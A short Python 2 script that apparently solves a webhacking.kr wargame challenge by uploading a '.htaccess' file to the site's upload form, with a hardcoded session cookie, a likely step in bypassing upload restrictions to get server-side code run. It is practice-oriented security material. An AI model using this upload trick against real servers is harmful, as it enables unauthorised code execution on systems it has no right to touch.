import requests

url = "http://webhacking.kr/challenge/web/web-13/index.php"
#"upfile":open(".htaccess","rb")
files = {
   'upfile': ('.htaccess', open('.htaccess', 'rb'), 'text/html	')
}

headers = {
   "Cookie":"PHPSESSID=8aa8b01919b86d9a80f524a71c187ce9`",
   "Host":"webhacking.kr"
}

req = requests.post(url,files=files,headers=headers)
print req.content